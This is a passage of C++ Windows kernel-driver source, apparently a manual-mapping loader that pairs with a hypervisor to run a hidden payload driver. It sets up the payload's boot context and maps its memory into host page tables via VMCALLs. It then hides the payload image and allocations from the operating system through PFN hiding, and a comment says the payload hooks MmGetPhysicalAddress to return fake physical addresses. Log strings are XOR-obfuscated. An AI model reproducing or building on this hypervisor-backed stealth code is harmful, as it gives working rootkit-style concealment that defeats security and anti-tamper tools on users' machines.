static bool mapdriver_hv_ready()
{
    // An absent hypervisor turns VMCALL/VMMCALL into #UD.  Run the guarded
    // probe on an expanded stack so exception dispatch cannot exhaust a
    // DriverEntry worker stack that has already traversed trace cleanup.
    if (KeGetCurrentIrql() > APC_LEVEL)
        return false;

    mapdriver_hv_probe_context ctx = {};
    NTSTATUS const status = KeExpandKernelStackAndCalloutEx(
        mapdriver_hv_probe_callout,
        &ctx,
        24 * 1024,
        FALSE,
        nullptr);
    return NT_SUCCESS(status) && ctx.completed && ctx.ready;
}

struct mapdriver_loader_context
{
    PUCHAR image;
    PVOID boot;
    BOOLEAN ok;
};

namespace
{
    constexpr ULONG mapdriver_bootstrap_watchdog_bugcheck = 0xE2000A02u;
    constexpr ULONG mapdriver_bootstrap_watchdog_stage_load_testdriver = 0x10u;
    constexpr ULONG mapdriver_bootstrap_watchdog_timeout_seconds = 20u;

    static KTIMER g_mapdriver_bootstrap_watchdog_timer;
    static KDPC g_mapdriver_bootstrap_watchdog_dpc;
    static volatile LONG g_mapdriver_bootstrap_watchdog_initialized = 0;
    static volatile LONG g_mapdriver_bootstrap_watchdog_armed = 0;
    static volatile ULONG g_mapdriver_bootstrap_watchdog_target_cpu = MAXULONG;
    static volatile ULONG g_mapdriver_bootstrap_watchdog_stage = 0;

    static VOID mapdriver_bootstrap_watchdog_dpc(
        _In_ KDPC*,
        _In_opt_ PVOID,
        _In_opt_ PVOID,
        _In_opt_ PVOID)
    {
        if (InterlockedCompareExchange(&g_mapdriver_bootstrap_watchdog_armed, 2, 1) != 1)
            return;

        KeBugCheckEx(
            mapdriver_bootstrap_watchdog_bugcheck,
            static_cast<ULONG_PTR>(g_mapdriver_bootstrap_watchdog_stage),
            static_cast<ULONG_PTR>(g_mapdriver_bootstrap_watchdog_target_cpu),
            static_cast<ULONG_PTR>(KeGetCurrentProcessorIndex()),
            reinterpret_cast<ULONG_PTR>(Utils::imageBase));
    }

    static void mapdriver_bootstrap_watchdog_disarm()
    {
        InterlockedExchange(&g_mapdriver_bootstrap_watchdog_armed, 0);
        KeCancelTimer(&g_mapdriver_bootstrap_watchdog_timer);
        KeRemoveQueueDpc(&g_mapdriver_bootstrap_watchdog_dpc);
    }

    static void mapdriver_bootstrap_watchdog_arm(ULONG stage)
    {
        if (InterlockedCompareExchange(&g_mapdriver_bootstrap_watchdog_initialized, 1, 0) == 0)
        {
            KeInitializeTimerEx(&g_mapdriver_bootstrap_watchdog_timer, NotificationTimer);
            KeInitializeDpc(&g_mapdriver_bootstrap_watchdog_dpc, mapdriver_bootstrap_watchdog_dpc, nullptr);
            KeSetImportanceDpc(&g_mapdriver_bootstrap_watchdog_dpc, HighImportance);
        }

        mapdriver_bootstrap_watchdog_disarm();

        ULONG const current = KeGetCurrentProcessorIndex();
        ULONG const active = KeQueryActiveProcessorCountEx(ALL_PROCESSOR_GROUPS);
        if (active > 1)
        {
            PROCESSOR_NUMBER target = {};
            ULONG const watchdogCpu = (current + 1) % active;
            if (NT_SUCCESS(KeGetProcessorNumberFromIndex(watchdogCpu, &target)))
                KeSetTargetProcessorDpcEx(&g_mapdriver_bootstrap_watchdog_dpc, &target);
        }

        g_mapdriver_bootstrap_watchdog_stage = stage;
        g_mapdriver_bootstrap_watchdog_target_cpu = current;
        KeMemoryBarrier();
        InterlockedExchange(&g_mapdriver_bootstrap_watchdog_armed, 1);

        LARGE_INTEGER due = {};
        due.QuadPart = -static_cast<LONGLONG>(mapdriver_bootstrap_watchdog_timeout_seconds) * 10LL * 1000LL * 1000LL;
        KeSetTimer(&g_mapdriver_bootstrap_watchdog_timer, due, &g_mapdriver_bootstrap_watchdog_dpc);
    }
}

static VOID mapdriver_loader_callout(PVOID context)
{
    auto ctx = (mapdriver_loader_context*)context;
    ctx->ok = Utils::LoadDriver(ctx->image, ctx->boot);
}

static bool mapdriver_load_testdriver(PUCHAR image)
{
    if (!image)
        return false;

    yvt_boot_context boot = {};
    boot.magic = YVT_BOOT_MAGIC;
    boot.size = sizeof(boot);
    boot.mm_allocate_independent_pages = (payload_u64)MmAllocateIndependentPages;
    boot.mm_free_independent_pages = (payload_u64)MmFreeIndependentPages;
    boot.mm_set_page_protection = (payload_u64)MmSetPageProtection;
    boot.flags |= YVT_BOOT_FLAG_KEEP_HV_ON_UNLOAD;
#if MAPDRIVER_PAYLOAD_ARENA_SIZE
    if (mapdriver_ensure_payload_arena())
    {
        boot.flags |= YVT_BOOT_FLAG_EXTERNAL_STATE;
        boot.state_arena = (payload_u64)Utils::payloadArenaBase;
        boot.state_arena_size = (payload_u64)Utils::payloadArenaSize;
        boot.state_arena_used = g_yvt_state_arena_used;
    }
#endif

    mapdriver_loader_context ctx = { image, &boot, FALSE };
    mapdriver_bootstrap_watchdog_arm(mapdriver_bootstrap_watchdog_stage_load_testdriver);
    NTSTATUS status = KeExpandKernelStackAndCalloutEx(
        mapdriver_loader_callout,
        &ctx,
        24 * 1024,
        FALSE,
        nullptr);
    mapdriver_bootstrap_watchdog_disarm();

    g_yvt_state_arena_used = boot.state_arena_used;
    LOG_DEBUG(_XOR_("[mapDriver] TestDriver boot flags=0x%llX boot_status=0x%llX state=0x%llX/0x%llX used=0x%llX\n"),
        boot.flags, boot.status, boot.state_arena, boot.state_arena_size, boot.state_arena_used);
    return NT_SUCCESS(status) && ctx.ok;
}

static void mapdriver_save_testdriver_image_base()
{
    if (!Utils::imageBase || !mapdriver_hv_ready())
        return;

    // Only publish the mapped image base.
    hv::vmcall_save_image_base((UINT64)Utils::imageBase, 0);
}

#if 0 || 0 || MAPDRIVER_PAYLOAD_HIDE_ENABLED
static bool mapdriver_section_name_is(const char* name, char c0, char c1, char c2, char c3, char c4, char c5)
{
    return name &&
        name[0] == c0 &&
        name[1] == c1 &&
        name[2] == c2 &&
        name[3] == c3 &&
        name[4] == c4 &&
        name[5] == c5;
}

static bool mapdriver_keep_section_visible(const Utils::SectionSnap& section)
{
    // Keep .pdata visible for unwind/stackwalk stability.
    return mapdriver_section_name_is(section.name, '.', 'p', 'd', 'a', 't', 'a');
}

static UINT64 mapdriver_page_down(UINT64 value)
{
    return value & ~(UINT64)(PAGE_SIZE - 1);
}

static UINT64 mapdriver_page_up(UINT64 value)
{
    return (value + PAGE_SIZE - 1) & ~(UINT64)(PAGE_SIZE - 1);
}

static UINT64 mapdriver_testdriver_tail_visible_begin()
{
    if (!Utils::imageBase || !Utils::imageSize || !MAPDRIVER_LEGACY_HYPERVISOR_TAIL_VISIBLE_PAGES)
        return 0;

    UINT64 image_base = (UINT64)Utils::imageBase;
    UINT64 image_end = mapdriver_page_up(image_base + Utils::imageSize);
    UINT64 tail_bytes = (UINT64)MAPDRIVER_LEGACY_HYPERVISOR_TAIL_VISIBLE_PAGES * PAGE_SIZE;

    if (Utils::imageSize <= tail_bytes)
        return image_base;

    return mapdriver_page_down(image_end - tail_bytes);
}

static bool mapdriver_testdriver_tail_visible_page(UINT64 va)
{
    UINT64 tail_begin = mapdriver_testdriver_tail_visible_begin();
    return tail_begin && va >= tail_begin;
}
#endif

#if 0 || MAPDRIVER_PAYLOAD_HIDE_ENABLED
static UINT64 mapdriver_real_pa_for_kernel_va(UINT64 va)
{
    UINT64 pa = 0;

#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
    // Once the payload's MmGetPhysicalAddress hook is installed, direct
    // MmGetPhysicalAddress(protected_va) intentionally returns a fake PA.
    // PFN hide/unhide bookkeeping still needs the real page-table PA, so use
    // the VT translation hypercall first.
    if (mapdriver_hv_ready())
    {
        __try
        {
            pa = hv::vmcall_get_physical_address(0, va);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            pa = 0;
        }
        if (pa)
            return pa;
    }
#endif

    __try
    {
        PHYSICAL_ADDRESS physical = MmGetPhysicalAddress((PVOID)va);
        pa = (UINT64)physical.QuadPart;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        pa = 0;
    }
    return pa;
}

static void mapdriver_note_pfn(UINT64* pfns, ULONG max_count, ULONG* count, UINT64 va)
{
    if (!pfns || !count || *count >= max_count)
        return;

    UINT64 pa = mapdriver_real_pa_for_kernel_va(va);
    if (!pa)
        return;

    pfns[(*count)++] = pa >> PAGE_SHIFT;
}

static void mapdriver_note_range_pfns(UINT64* pfns, ULONG max_count, ULONG* count, UINT64 base, UINT64 size)
{
    if (!base || !size)
        return;

    UINT64 begin = mapdriver_page_down(base);
    UINT64 limit = base + size;
    if (limit < base)
        return;
    UINT64 end = mapdriver_page_up(limit);
    for (UINT64 va = begin; va < end; va += PAGE_SIZE)
        mapdriver_note_pfn(pfns, max_count, count, va);
}
#endif



static void mapdriver_apply_testdriver_hide_lock()
{

}

static volatile LONG g_pool_adopt_busy = 0;
static payload_pool_block g_pool_adopt_blocks[512];
static constexpr ULONG kMapdriverMaxResidentPoolBlocks = 4096;

static payload_u64 mapdriver_snapshot_resident_pool_blocks(
    payload_pool_block* blocks,
    ULONG max_blocks,
    const payload_status* status,
    const char* phase,
    const char* purpose)
{
    if (!blocks || !max_blocks)
        return 0;

    static_assert(sizeof(hv::pool_block_record) == sizeof(payload_pool_block),
        "pool block ABI mismatch");

    RtlZeroMemory(blocks, sizeof(payload_pool_block) * max_blocks);

    payload_u64 expected = 0;
    payload_u64 capacity = 0;
    payload_u64 manifest = 0;
    if (status && status->magic == PAYLOAD_STATUS_MAGIC)
    {
        expected = status->resident_pool_count;
        capacity = status->resident_pool_capacity;
        manifest = status->resident_pool_manifest;
        if (capacity && expected > capacity)
            expected = capacity;
        if (expected > max_blocks)
            expected = max_blocks;
    }

    //
    // The resident manifest lives in payload-owned memory.  After the payload
    // image is hidden, guest-mode dereference of status.resident_pool_manifest
    // sees the dummy PFN and returns zero records.  Always prefer the resident
    // root-mode GET_POOL_BLOCKS hypercall: it reads the manifest with host
    // accesses and copies a visible snapshot into this mapDriver buffer.
    //
    payload_u64 count = 0;
    if (mapdriver_hv_ready())
    {
        __try
        {
            count = hv::vmcall_get_pool_blocks(
                (hv::pool_block_record*)blocks,
                max_blocks);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            LOG_DEBUG(_XOR_("[payload] pool snapshot %s/%s vmcall fault code=0x%X\n"),
                phase ? phase : "?",
                purpose ? purpose : "?",
                GetExceptionCode());
            count = 0;
        }
    }

    if (count > max_blocks)
        count = max_blocks;

    // Fallback for early/legacy phases before the bridge owns GET_POOL_BLOCKS.
    // This only works while the manifest page is still guest-visible.
    if (!count && expected && manifest)
    {
        auto src = (const payload_pool_block*)manifest;
        __try
        {
            for (payload_u64 i = 0; i < expected; ++i)
                blocks[i] = src[i];
            count = expected;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            LOG_DEBUG(_XOR_("[payload] pool snapshot %s/%s direct fault code=0x%X manifest=0x%llX expected=%llu\n"),
                phase ? phase : "?",
                purpose ? purpose : "?",
                GetExceptionCode(),
                manifest,
                expected);
            count = 0;
        }
    }

    payload_u64 valid = 0;
    payload_u64 bytes = 0;
    for (payload_u64 i = 0; i < count; ++i)
    {
        if (!blocks[i].va || !blocks[i].bytes)
            continue;
        valid++;
        bytes += blocks[i].bytes;
    }

    LOG_DEBUG(_XOR_("[payload] pool snapshot %s/%s count=%llu valid=%llu bytes=0x%llX expected=%llu manifest=0x%llX\n"),
        phase ? phase : "?",
        purpose ? purpose : "?",
        count,
        valid,
        bytes,
        expected,
        manifest);

    return count;
}

static payload_u64 mapdriver_adopt_testdriver_pool_blocks(const char* phase)
{
    if (g_payload_detached)
    {
        LOG_DEBUG(_XOR_("[payload] pool adopt skipped %s: payload already detached\n"), phase);
        return PAYLOAD_RESULT_INVALID_CONTEXT;
    }

    if (!mapdriver_hv_ready() ||
        !Utils::payloadExports ||
        !Utils::payloadExports->adopt_pool_blocks)
    {
        LOG_DEBUG(_XOR_("[payload] pool adopt skipped %s: hv/exports not ready\n"), phase);
        return PAYLOAD_RESULT_INVALID_CONTEXT;
    }

    constexpr ULONG kMaxBlocks =
        (ULONG)(sizeof(g_pool_adopt_blocks) / sizeof(g_pool_adopt_blocks[0]));
    static_assert(sizeof(hv::pool_block_record) == sizeof(payload_pool_block),
        "pool block ABI mismatch");

    if (_InterlockedCompareExchange(&g_pool_adopt_busy, 1, 0) != 0)
    {
        LOG_DEBUG(_XOR_("[payload] pool adopt skipped %s: busy\n"), phase);
        return PAYLOAD_RESULT_ALLOC_FAILED;
    }

    RtlZeroMemory(g_pool_adopt_blocks, sizeof(g_pool_adopt_blocks));

    UINT64 count = 0;
    __try
    {
        count = hv::vmcall_get_pool_blocks(
            (hv::pool_block_record*)g_pool_adopt_blocks,
            kMaxBlocks);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        count = 0;
    }

    if (count > kMaxBlocks)
        count = kMaxBlocks;

    payload_u64 total = 0;
    payload_u64 independent = 0;
    payload_u64 fallback = 0;
    for (UINT64 i = 0; i < count; ++i)
    {
        if (!g_pool_adopt_blocks[i].va || !g_pool_adopt_blocks[i].bytes)
            continue;

        total += g_pool_adopt_blocks[i].bytes;
        if (g_pool_adopt_blocks[i].flags & PAYLOAD_POOL_BLOCK_FLAG_INDEPENDENT)
            independent++;
        if (g_pool_adopt_blocks[i].flags & PAYLOAD_POOL_BLOCK_FLAG_FALLBACK)
            fallback++;
    }

    payload_u64 result = PAYLOAD_RESULT_INVALID_CONTEXT;
    if (count)
    {
        __try
        {
            result = Utils::payloadExports->adopt_pool_blocks(
                g_pool_adopt_blocks,
                count,
                PAYLOAD_POOL_ADOPT_FLAG_REPLACE);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            result = PAYLOAD_RESULT_INVALID_CONTEXT;
        }
    }

    LOG_DEBUG(_XOR_("[payload] pool adopt %s result=0x%llX blocks=%llu bytes=0x%llX indep=%llu fallback=%llu\n"),
        phase,
        result,
        count,
        total,
        independent,
        fallback);

    RtlSecureZeroMemory(g_pool_adopt_blocks, sizeof(g_pool_adopt_blocks));
    _InterlockedExchange(&g_pool_adopt_busy, 0);
    return result;
}

static bool mapdriver_query_payload_status(payload_status* out);
static void mapdriver_fill_migration_check(mapctl_migration_check* out);

static void mapdriver_log_payload_status(const char* phase)
{
    payload_status status = {};
    if (!mapdriver_query_payload_status(&status))
    {
        LOG_DEBUG(_XOR_("[payload] status %s unavailable exports=%p detached=%d\n"),
            phase, Utils::payloadExports, (int)g_payload_detached);
        return;
    }

    LOG_DEBUG(_XOR_("[payload] status %s flags=0x%llX start=%llu stop=%llu ping=%llu hb=%llu worker=%llu last=0x%llX\n"),
        phase,
        status.state_flags,
        status.start_count,
        status.stop_count,
        status.ping_count,
        status.heartbeat_count,
        status.worker_running,
        status.last_result);
    LOG_DEBUG(_XOR_("[payload] status %s image=0x%llX size=0x%llX boot=0x%llX api=0x%llX api_magic=0x%llX api_flags=0x%llX\n"),
        phase,
        status.image_base,
        status.image_size,
        status.boot_flags,
        status.host_api,
        status.host_api_magic,
        status.host_api_flags);
    LOG_DEBUG(_XOR_("[payload] status %s runtime magic=0x%llX owner=%llu phase=%llu flags=0x%llX gen=%llu ctx=0x%llX\n"),
        phase,
        status.runtime_magic,
        status.runtime_owner,
        status.runtime_phase,
        status.runtime_flags,
        status.runtime_generation,
        status.runtime_context);
    LOG_DEBUG(_XOR_("[payload] status %s arena=0x%llX size=0x%llX used=0x%llX flags=0x%llX\n"),
        phase,
        status.arena_base,
        status.arena_size,
        status.arena_used,
        status.arena_flags);
    LOG_DEBUG(_XOR_("[payload] status %s kernel=0x%llX ext_ref=0x%llX independent=%llu\n"),
        phase,
        status.kernel_api_flags,
        status.external_ref_flags,
        status.independent);
    LOG_DEBUG(_XOR_("[payload] status %s direct=0x%llX size=0x%llX owned_count=%llu owned_bytes=0x%llX\n"),
        phase,
        status.direct_alloc_base,
        status.direct_alloc_size,
        status.owned_alloc_count,
        status.owned_alloc_bytes);
}

static bool mapdriver_query_payload_status(payload_status* out)
{
    if (!out)
        return false;

    RtlZeroMemory(out, sizeof(*out));

    // After resident handoff the long-term control path must not execute the
    // guest-visible payload image via payload_exports->get_status.  Query the
    // status from root mode through the payload bridge instead; this keeps
    // status usable once payload image/direct pages are hidden from the guest.
    if (g_payload_detached && mapdriver_hv_ready())
    {
        __try
        {
            payload_u64 result = hv::vmcall_get_payload_status(out, sizeof(*out));
            return result == PAYLOAD_RESULT_OK && out->magic == PAYLOAD_STATUS_MAGIC;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            RtlZeroMemory(out, sizeof(*out));
            return false;
        }
    }

    if (!Utils::payloadExports || !Utils::payloadExports->get_status)
        return false;

    payload_u64 result = Utils::payloadExports->get_status(out);
    return result == PAYLOAD_RESULT_OK && out->magic == PAYLOAD_STATUS_MAGIC;
}

static payload_u64 mapdriver_set_payload_mode(payload_u64 kind, payload_u64 mode)
{
    if (g_payload_detached && mapdriver_hv_ready())
    {
        __try
        {
            return hv::vmcall_set_payload_mode(kind, mode);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            return PAYLOAD_RESULT_INVALID_CONTEXT;
        }
    }

    if (!Utils::payloadExports)
        return PAYLOAD_RESULT_INVALID_CONTEXT;

    switch (kind)
    {
    case hv::payload_mode_vtret:
        return Utils::payloadExports->set_vtret_mode
            ? Utils::payloadExports->set_vtret_mode(mode)
            : PAYLOAD_RESULT_INVALID_CONTEXT;
    case hv::payload_mode_tramp:
        return Utils::payloadExports->set_tramp_mode
            ? Utils::payloadExports->set_tramp_mode(mode)
            : PAYLOAD_RESULT_INVALID_CONTEXT;
    case hv::payload_mode_hook:
        return Utils::payloadExports->set_hook_mode
            ? Utils::payloadExports->set_hook_mode(mode)
            : PAYLOAD_RESULT_INVALID_CONTEXT;
    case hv::payload_mode_ept:
        return Utils::payloadExports->set_ept_mode
            ? Utils::payloadExports->set_ept_mode(mode)
            : PAYLOAD_RESULT_INVALID_CONTEXT;
    case hv::payload_mode_legacy_detach:
        return Utils::payloadExports->detach_legacy_data
            ? Utils::payloadExports->detach_legacy_data(mode)
            : PAYLOAD_RESULT_INVALID_CONTEXT;
    default:
        return PAYLOAD_RESULT_INVALID_CONTEXT;
    }
}

static bool mapdriver_payload_barrier_ready(const payload_status* status)
{
    if (!status || status->magic != PAYLOAD_STATUS_MAGIC)
        return false;

    payload_u64 required =
        PAYLOAD_RUNTIME_FLAG_STARTED |
        PAYLOAD_RUNTIME_FLAG_ARENA_READY |
        PAYLOAD_RUNTIME_FLAG_KERNEL_API_READY |
        PAYLOAD_RUNTIME_FLAG_BOOTSTRAP_SEALED |
        PAYLOAD_RUNTIME_FLAG_DIRECT_ALLOC_READY |
        PAYLOAD_RUNTIME_FLAG_SELF_ALLOC_READY |
        PAYLOAD_RUNTIME_FLAG_WORKER_API_READY |
        PAYLOAD_RUNTIME_FLAG_HOST_STATE_READY |
        PAYLOAD_RUNTIME_FLAG_HOST_STACK_READY |
        PAYLOAD_RUNTIME_FLAG_STACK_DESC_READY;

    return status->independent &&
        status->external_ref_flags == PAYLOAD_EXTERNAL_REF_NONE &&
        status->host_api == 0 &&
        (status->runtime_flags & required) == required &&
        status->runtime_owner == PAYLOAD_RUNTIME_OWNER_PAYLOAD &&
        status->runtime_phase == PAYLOAD_RUNTIME_PHASE_STARTED;
}

static payload_u64 mapdriver_align_up_page_u64(payload_u64 value)
{
    if (!value)
        return 0;
    payload_u64 aligned = (value + PAGE_SIZE - 1) & ~(payload_u64)(PAGE_SIZE - 1);
    return (aligned >= value) ? aligned : value;
}

static bool mapdriver_vmcall_map_host_range_logged(payload_u64 base,
                                                   payload_u64 size,
                                                   const char* phase,
                                                   const char* name,
                                                   bool required)
{
    if (!base || !size)
        return !required;

    bool ok = false;
    __try
    {
        ok = hv::vmcall_map_host_range(base, size);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        ok = false;
    }

    LOG_DEBUG(_XOR_("[mapDriver] hostmap %s %s base=0x%llX size=0x%llX ok=%d required=%d\n"),
        phase ? phase : "?",
        name ? name : "?",
        base,
        size,
        (int)ok,
        (int)required);

    return ok || !required;
}

static bool mapdriver_payload_pool_tag_has_code(unsigned int tag)
{
    // Adopted TestDriver PoolManager tag for trampoline executable pages.
    // These pages are later used by hook/EPT trampoline paths and therefore
    // must have a private HOST_CR3 mapping before the guest-visible PFN/PTE
    // view is altered.
    return tag == 'tram';
}

static payload_u64 mapdriver_payload_hostmapped_arena_bytes(const payload_status& ps)
{
    payload_u64 arena_bytes = ps.arena_used ? mapdriver_align_up_page_u64(ps.arena_used) : ps.arena_size;
    if (ps.arena_size && arena_bytes > ps.arena_size)
        arena_bytes = ps.arena_size;
    return arena_bytes;
}

static bool mapdriver_payload_pool_block_in_known_hostmap(const payload_status& ps,
                                                          payload_u64 va,
                                                          payload_u64 bytes)
{
    if (!va || !bytes)
        return false;

    if (mapdriver_va_in_range(va, ps.image_base, ps.image_size, bytes) ||
        mapdriver_va_in_range(va, ps.direct_alloc_base, ps.direct_alloc_size, bytes) ||
        mapdriver_va_in_range(va, ps.host_stack_base, ps.host_stack_size, bytes) ||
        mapdriver_va_in_range(va, ps.arena_base, mapdriver_payload_hostmapped_arena_bytes(ps), bytes))
    {
        return true;
    }

    if (mapdriver_va_in_range(va, ps.host_state_base, ps.host_state_size, bytes))
        return true;

    if (ps.host_stack_desc_base && ps.host_stack_desc_count)
    {
        payload_u64 desc_bytes = ps.host_stack_desc_count * (payload_u64)sizeof(payload_host_stack_descriptor);
        if (desc_bytes &&
            (desc_bytes / sizeof(payload_host_stack_descriptor)) == ps.host_stack_desc_count &&
            mapdriver_va_in_range(va, ps.host_stack_desc_base, desc_bytes, bytes))
        {
            return true;
        }
    }

    return false;
}

static bool mapdriver_map_payload_host_pool_blocks(const payload_status& ps,
                                                   const char* phase)
{
#if MAPDRIVER_PAYLOAD_HOSTMAP_CODE_POOLS || MAPDRIVER_PAYLOAD_HOSTMAP_ALL_POOLS
    if (!ps.resident_pool_manifest || !ps.resident_pool_count)
    {
        LOG_DEBUG(_XOR_("[payload] hostmap pool skipped %s: manifest=0x%llX count=%llu\n"),
            phase ? phase : "?",
            ps.resident_pool_manifest,
            ps.resident_pool_count);
        return true;
    }

    auto blocks = (payload_pool_block*)ExAllocatePoolWithTag(
        NonPagedPoolNx,
        sizeof(payload_pool_block) * kMapdriverMaxResidentPoolBlocks,
        'mRhP');
    if (!blocks)
    {
        LOG_DEBUG(_XOR_("[payload] hostmap pool skipped %s: snapshot alloc failed\n"),
            phase ? phase : "?");
        return false;
    }

    bool ok = true;
    payload_u64 count = mapdriver_snapshot_resident_pool_blocks(
        blocks,
        kMapdriverMaxResidentPoolBlocks,
        &ps,
        phase,
        "hostmap-pool");

    payload_u64 valid = 0;
    payload_u64 selected = 0;
    payload_u64 mapped = 0;
    payload_u64 skipped_known = 0;
    payload_u64 skipped_noncode = 0;
    payload_u64 failed = 0;
    payload_u64 bytes = 0;

    if (!count)
    {
        ok = false;
        LOG_DEBUG(_XOR_("[payload] hostmap pool failed %s: resident count=%llu but snapshot count=0\n"),
            phase ? phase : "?",
            ps.resident_pool_count);
    }

    __try
    {
        for (payload_u64 i = 0; i < count; ++i)
        {
            payload_pool_block b = blocks[i];
            if (!b.va || !b.bytes)
                continue;

            valid++;

            if (mapdriver_payload_pool_block_in_known_hostmap(ps, b.va, b.bytes))
            {
                skipped_known++;
                continue;
            }

#if !MAPDRIVER_PAYLOAD_HOSTMAP_ALL_POOLS
            if (!mapdriver_payload_pool_tag_has_code(b.tag))
            {
                skipped_noncode++;
                continue;
            }
#endif

            selected++;
            bytes += b.bytes;
            if (mapdriver_vmcall_map_host_range_logged(
                b.va,
                b.bytes,
                phase,
                "payload-pool-code",
                true))
            {
                mapped++;
            }
            else
            {
                failed++;
                ok = false;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        ok = false;
        LOG_DEBUG(_XOR_("[payload] hostmap pool fault %s code=0x%X count=%llu\n"),
            phase ? phase : "?",
            GetExceptionCode(),
            count);
    }

    LOG_DEBUG(_XOR_("[payload] hostmap pool %s count=%llu valid=%llu selected=%llu mapped=%llu failed=%llu known=%llu noncode=%llu bytes=0x%llX mode=%s\n"),
        phase ? phase : "?",
        count,
        valid,
        selected,
        mapped,
        failed,
        skipped_known,
        skipped_noncode,
        bytes,
        (MAPDRIVER_PAYLOAD_HOSTMAP_ALL_POOLS ? "all" : "code")
    );

    RtlSecureZeroMemory(blocks, sizeof(payload_pool_block) * kMapdriverMaxResidentPoolBlocks);
    ExFreePoolWithTag(blocks, 'mRhP');
    return ok;
#else
    UNREFERENCED_PARAMETER(ps);
    UNREFERENCED_PARAMETER(phase);
    return true;
#endif
}

static bool mapdriver_map_payload_host_resident_ranges(const payload_status& ps,
                                                       const char* phase)
{
    if (ps.magic != PAYLOAD_STATUS_MAGIC)
        return false;

    bool ok = true;

    // Root-mode payload bridge and MM hook handlers can execute/read all of
    // these ranges after VMCS_HOST_RIP is switched.  Mapping only image/stack
    // leaves direct state descriptors or migrated legacy ghv/vt tables (arena)
    // dependent on System CR3 and can #PF/triple-fault under VT host CR3.
    ok = mapdriver_vmcall_map_host_range_logged(
        ps.image_base,
        ps.image_size,
        phase,
        "payload-image",
        true) && ok;

    ok = mapdriver_vmcall_map_host_range_logged(
        ps.direct_alloc_base,
        ps.direct_alloc_size,
        phase,
        "payload-direct",
        true) && ok;

    ok = mapdriver_vmcall_map_host_range_logged(
        ps.host_stack_base,
        ps.host_stack_size,
        phase,
        "payload-host-stack",
        true) && ok;

    payload_u64 arena_bytes = mapdriver_payload_hostmapped_arena_bytes(ps);
    ok = mapdriver_vmcall_map_host_range_logged(
        ps.arena_base,
        arena_bytes,
        phase,
        "payload-arena-used",
        true) && ok;

    if (ps.host_state_base && ps.host_state_size &&
        !mapdriver_va_in_range(ps.host_state_base, ps.direct_alloc_base, ps.direct_alloc_size, ps.host_state_size))
    {
        ok = mapdriver_vmcall_map_host_range_logged(
            ps.host_state_base,
            ps.host_state_size,
            phase,
            "payload-host-state",
            true) && ok;
    }

    if (ps.host_stack_desc_base && ps.host_stack_desc_count)
    {
        payload_u64 desc_bytes = ps.host_stack_desc_count * (payload_u64)sizeof(payload_host_stack_descriptor);
        if (desc_bytes &&
            !mapdriver_va_in_range(ps.host_stack_desc_base, ps.direct_alloc_base, ps.direct_alloc_size, desc_bytes))
        {
            ok = mapdriver_vmcall_map_host_range_logged(
                ps.host_stack_desc_base,
                desc_bytes,
                phase,
                "payload-host-desc",
                true) && ok;
        }
    }

    ok = mapdriver_map_payload_host_pool_blocks(ps, phase) && ok;

    return ok;
}

static bool mapdriver_log_payload_barrier(const char* phase)
{
    payload_status status = {};
    bool have_status = mapdriver_query_payload_status(&status);
    bool ready = have_status && mapdriver_payload_barrier_ready(&status);
    LOG_DEBUG(_XOR_("[payload] barrier %s ready=%d have=%d independent=%llu ext_ref=0x%llX rt_flags=0x%llX phase=%llu owner=%llu host_api=0x%llX\n"),
        phase,
        (int)ready,
        (int)have_status,
        have_status ? status.independent : 0,
        have_status ? status.external_ref_flags : 0,
        have_status ? status.runtime_flags : 0,
        have_status ? status.runtime_phase : 0,
        have_status ? status.runtime_owner : 0,
        have_status ? status.host_api : 0);
    return ready;
}

static ULONG mapdriver_hide_range_pfns_chunked(UINT64 base, UINT64 size);

static void mapdriver_hide_payload_memory(const char* phase)
{
#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
    payload_status status = {};
    if (!mapdriver_query_payload_status(&status) || !mapdriver_payload_barrier_ready(&status))
    {
        LOG_DEBUG(_XOR_("[payload] hide skipped %s: barrier not ready\n"), phase);
        return;
    }

    if (!mapdriver_hv_ready())
    {
        LOG_DEBUG(_XOR_("[payload] hide skipped %s: hv not ready\n"), phase);
        return;
    }

    ULONG pfn_count = 0;
#if MAPDRIVER_PAYLOAD_HIDE_IMAGE_ENABLED
    pfn_count += mapdriver_hide_range_pfns_chunked(status.image_base, status.image_size);
#endif
#if MAPDRIVER_PAYLOAD_HIDE_ARENA_ENABLED
    pfn_count += mapdriver_hide_range_pfns_chunked(status.arena_base, status.arena_size);
#endif
#if MAPDRIVER_PAYLOAD_HIDE_DIRECT_ENABLED
    pfn_count += mapdriver_hide_range_pfns_chunked(status.direct_alloc_base, status.direct_alloc_size);
#endif

    LOG_DEBUG(_XOR_("[payload] hide %s pfns=%lu image=0x%llX/0x%llX arena=0x%llX/0x%llX direct=0x%llX/0x%llX\n"),
        phase,
        pfn_count,
        status.image_base,
        status.image_size,
        status.arena_base,
        status.arena_size,
        status.direct_alloc_base,
        status.direct_alloc_size);
#else
    UNREFERENCED_PARAMETER(phase);
#endif
}

static void mapdriver_hide_payload_arena_used(const char* phase)
{
#if MAPDRIVER_PAYLOAD_HIDE_ENABLED
    payload_status status = {};
    if (!mapdriver_query_payload_status(&status) ||
        !mapdriver_payload_barrier_ready(&status) ||
        !mapdriver_hv_ready())
    {
        LOG_DEBUG(_XOR_("[payload] arena hide skipped %s: status/barrier/hv not ready\n"), phase);
        return;
    }

    payload_u64 arena_base = status.arena_base;
    payload_u64 arena_size = status.arena_size;
    payload_u64 arena_used = status.arena_used;
    if (!arena_base || !arena_size || !arena_used)
    {
        LOG_DEBUG(_XOR_("[payload] arena hide skipped %s: arena=0x%llX size=0x%llX used=0x%llX\n"),
            phase, arena_base, arena_size, arena_used);
        return;
    }

    if (arena_used > arena_size)
        arena_used = arena_size;
    arena_used = (arena_used + PAGE_SIZE - 1) & ~(payload_u64)(PAGE_SIZE - 1);
    if (arena_used > arena_size)
        arena_used = arena_size;

    ULONG pfn_count = mapdriver_hide_range_pfns_chunked(arena_base, arena_used);

